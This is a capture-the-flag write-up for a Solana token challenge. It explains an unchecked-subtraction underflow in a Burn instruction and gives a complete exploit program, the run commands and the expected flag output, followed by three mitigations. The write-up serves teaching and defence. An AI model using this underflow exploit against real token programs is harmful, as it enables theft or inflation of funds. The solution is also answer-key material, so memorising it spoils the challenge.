# Solution: Token Overflow

## Vulnerability Analysis

The vulnerability is an **Integer Underflow** in the `Burn` instruction due to unchecked arithmetic operations.

### The Vulnerable Code

In `program/src/processor.rs`, the `process_burn` function:

```rust
fn process_burn(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    // ... validation code ...
    
    let mut token_data = TokenAccount::try_from_slice(&token_account.data.borrow())?;

    if token_data.owner != *owner_account.key {
        msg!("Only token owner can burn tokens");
        return Err(ProgramError::InvalidAccountData);
    }

    // VULNERABILITY: Unchecked subtraction!
    // If amount > balance, this wraps around
    token_data.balance -= amount;

    token_data.serialize(&mut &mut token_account.data.borrow_mut()[..])?;
    Ok(())
}
```

### The Problem

1. **No Balance Check:** Unlike the `Transfer` function, `Burn` doesn't verify `balance >= amount`
2. **Unchecked Arithmetic:** The program compiles with `overflow-checks = false` in release mode
3. **Integer Wraparound:** When `amount > balance`, subtraction wraps around

### Example

```rust
// Starting balance: 100 tokens
// Burn amount: 200 tokens
// Result: 100 - 200 = 18446744073709551516 (u64::MAX - 99)
```

## Exploitation

### Step 1: Understanding Integer Underflow

In Rust, unsigned integer underflow wraps around to the maximum value:
- `u64::MAX` = 18,446,744,073,709,551,615
- If `balance = 100` and we subtract `200`:
  - Debug mode: panic
  - Release mode (overflow-checks=false): `100 - 200 = u64::MAX - 99`

### Step 2: Implementing the Exploit

Create a solve program that calls the `Burn` instruction with more tokens than we have:

```rust
// solve/src/processor.rs
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    pubkey::Pubkey,
    instruction::{AccountMeta, Instruction},
};
use borsh::BorshSerialize;

#[derive(BorshSerialize)]
pub enum TokenInstruction {
    Initialize,
    Mint { amount: u64 },
    Burn { amount: u64 },
    Transfer { amount: u64 },
}

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("Exploit starting...");
    
    let account_info_iter = &mut accounts.iter();
    let user_account = next_account_info(account_info_iter)?;
    let token_program = next_account_info(account_info_iter)?;
    let user_token_account = next_account_info(account_info_iter)?;
    
    // Burn more tokens than we have to trigger underflow
    let burn_amount: u64 = 200; // We only have 100
    
    let burn_instruction = Instruction {
        program_id: *token_program.key,
        accounts: vec![
            AccountMeta::new(*user_token_account.key, false),
            AccountMeta::new(*user_account.key, true),
        ],
        data: TokenInstruction::Burn { amount: burn_amount }
            .try_to_vec()
            .unwrap(),
    };
    
    invoke(
        &burn_instruction,
        &[user_token_account.clone(), user_account.clone()],
    )?;
    
    msg!("Exploit successful!");
    Ok(())
}
```

### Step 3: Building and Running

```bash
# Build the solve program
cd solve
cargo build-sbf

# Run the exploit
cd ..
python3 solve.py localhost 5004
```

### Expected Output

```
[*] Connecting to challenge server...
[+] Connected!

╔════════════════════════════════════════════════╗
║        H7CTF 2025 - Token Overflow             ║
║                                                ║
║  A basic token system with standard ops...     ║
║  Can you exploit arithmetic vulnerabilities?   ║
╚════════════════════════════════════════════════╝

...

[*] Running your exploit program...

Program log: Exploit starting...
Program log: Instruction: Burn
Program log: Burned 200 tokens. New balance: 18446744073709551516

[*] Exploit execution complete.
[*] Checking win condition...

═══════════════════════════════════════════════
Final State:
  Token Balance: 18446744073709551516
  Required: 1000000
═══════════════════════════════════════════════

[+] Success! You exploited the vulnerability.
[+] Flag: H7CTF{1nt3ger_und3rf10w_1n_th1s_d4y_and_ag3_<UUID>}
```

## Mitigation

### Fix #1: Use Checked Arithmetic

```rust
fn process_burn(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    // ... validation code ...
    
    let mut token_data = TokenAccount::try_from_slice(&token_account.data.borrow())?;

    if token_data.owner != *owner_account.key {
        return Err(ProgramError::InvalidAccountData);
    }

    // FIX: Use checked_sub() to prevent underflow
    token_data.balance = token_data.balance
        .checked_sub(amount)
        .ok_or(ProgramError::InsufficientFunds)?;

    token_data.serialize(&mut &mut token_account.data.borrow_mut()[..])?;
    Ok(())
}
```

### Fix #2: Add Balance Validation

```rust
fn process_burn(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    // ... validation code ...
    
    let mut token_data = TokenAccount::try_from_slice(&token_account.data.borrow())?;

    if token_data.owner != *owner_account.key {
        return Err(ProgramError::InvalidAccountData);
    }

    // FIX: Check balance before subtraction
    if token_data.balance < amount {
        msg!("Insufficient token balance");
        return Err(ProgramError::InsufficientFunds);
    }

    token_data.balance -= amount;

    token_data.serialize(&mut &mut token_account.data.borrow_mut()[..])?;
    Ok(())
}
```

### Fix #3: Enable Overflow Checks

```toml
# Cargo.toml
[profile.release]
overflow-checks = true  # Changed from false
lto = "fat"
codegen-units = 1
```

## Key Takeaways

1. **Always validate inputs** before arithmetic operations
2. **Use checked arithmetic** (`checked_add`, `checked_sub`, `checked_mul`)
3. **Enable overflow checks** in production builds
4. **Rust's safety guarantees** differ between debug and release modes
5. **Financial operations require extra scrutiny** - integer bugs can be catastrophic

## Real-World Impact

Similar vulnerabilities have affected:
- Token programs with incorrect balance updates
- DeFi protocols with reward calculations
- Staking systems with withdrawal logic

Always audit arithmetic operations in smart contracts!
